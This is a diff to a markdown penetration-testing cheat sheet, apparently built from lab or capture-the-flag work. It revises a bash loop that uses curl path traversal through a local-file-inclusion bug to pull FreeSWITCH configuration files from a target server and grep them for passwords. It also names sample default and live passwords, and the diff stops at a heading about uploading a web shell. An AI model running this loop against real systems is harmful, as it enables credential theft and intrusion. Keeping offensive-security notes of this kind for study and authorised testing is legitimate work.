@@ -26,12 +26,17 @@ See [[LFI_RFI]].
 
 ### Carve many files through one LFI (loop)
 ```bash
-for i in $(cat tmp); do
-  curl -s -q --path-as-is "http://<IP>/path/../../etc/freeswitch/autoload_configs/$i" >> carve
+# build tmp FROM INSIDE the mounted backup so paths are anchored to the TARGET's root
+cd /mnt/<share> && grep -Ril password . | sed 's#^\.#/#' > ~/tmp   # → /etc/freeswitch/autoload_configs/x.xml
+mkdir -p loot
+for i in $(cat ~/tmp); do
+  curl -s --path-as-is "http://<IP>/../../../../../../../../..$i" -o "loot/$(echo "$i" | tr '/' '_')"
 done
-grep -i password carve
+grep -Ri password loot/
 ```
-→ `tmp` holds a list of candidate filenames (build it with `grep -Ril` — see [[Grep]]). The loop fetches each one through the traversal and **appends** (`>>`, not `>` which would overwrite) every response into a single file `carve`; then one grep finds the secret across all of them. **Why bother:** when a *live* config differs from a backup you already grabbed (the backup had only a default password), this re-pulls the real files.
+→ `tmp` holds **target-anchored** paths (`/etc/...`, NOT `/mnt/.../etc/...`) so each one drops straight onto the end of the traversal — don't hardcode a directory in the URL, let `$i` carry the full path. Build it by grepping *from inside* the mount and `sed`-stripping the leading `.` so the mount prefix never appears (see [[Grep]]).
+→ Use `-o` to write **one file per result**, not `>> carve` (a single blob has no separators and silently mixes in misses). A **miss** returns the app's own page (`Content-Type: text/html`); a **hit** returns `Content-Type: application/octet-stream`. Drop the misses afterward: `grep -l '<title>App Name</title>' loot/* | xargs rm`.
+→ **Why bother:** when a *live* config differs from a backup you already grabbed (the backup had only a default password), this re-pulls the real files. Clue: backup ESL pw `ClueCon` → live `StrongClueConEight021`.
 
 ### Upload a shell past browser-side validation
 ```bash
